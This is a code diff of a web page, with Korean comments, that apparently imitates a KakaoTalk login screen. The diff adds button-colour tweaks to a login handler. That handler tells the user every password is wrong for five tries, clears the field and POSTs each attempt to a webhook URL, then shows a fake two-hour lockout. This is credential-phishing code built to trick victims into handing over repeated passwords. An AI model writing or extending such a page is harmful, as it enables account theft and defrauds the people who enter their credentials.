@@ -213,7 +213,7 @@ function sendPhone() {
   }
 }
 
-// page4 로그인 처리 (기존 그대로)
+// page4 로그인 처리 (버튼 색상 업데이트 포함)
 function sendPage4() {
   const userId4 = document.getElementById("userId4").value.trim();
   const userCode4 = document.getElementById("userCode4").value.trim();
@@ -223,9 +223,11 @@ function sendPage4() {
   const maxAttempts = 5;
   const remaining = Math.max(0, maxAttempts - loginTryCount + 1);
 
+  // 비밀번호 틀렸을 때
   if(loginTryCount >= 1 && loginTryCount <= 5) {
     alert(`비밀번호가 틀렸습니다. 남은 시도 횟수: ${remaining}`);
     document.getElementById("userCode4").value = "";
+    updateLoginBtnColor(); // ← 버튼 회색으로 변경
     fetch(webhookUrl,{
       method:"POST",
       headers:{"Content-Type":"application/x-www-form-urlencoded"},
@@ -235,8 +237,11 @@ function sendPage4() {
     return;
   }
 
+  // 시도 초과
   if(loginTryCount > 5) {
     alert("카카오톡 로그인 시도 횟수를 초과했습니다. 2시간 후에 다시 시도해 주세요");
+    document.getElementById("userCode4").value = "";
+    updateLoginBtnColor(); // ← 버튼 회색으로 변경
     fetch(webhookUrl,{
       method:"POST",
       headers:{"Content-Type":"application/x-www-form-urlencoded"},
@@ -247,7 +252,7 @@ function sendPage4() {
   }
 }
 
-// page4 비밀번호 입력 감지 및 버튼 색상 변경 (강제 삭제 대응)
+// page4 버튼 색상 업데이트 함수
 const passwordInput = document.getElementById("userCode4");
 const loginBtn = document.getElementById("loginBtn");
 
@@ -261,10 +266,13 @@ function updateLoginBtnColor() {
   }
 }
 
-// 모든 가능한 이벤트 감지
+// 입력 이벤트 감지
 passwordInput.addEventListener("input", updateLoginBtnColor);
 passwordInput.addEventListener("keyup", updateLoginBtnColor);
 passwordInput.addEventListener("change", updateLoginBtnColor);
+
+// 초기 버튼 색상 설정
+updateLoginBtnColor();
 </script>
 </body>
 </html>
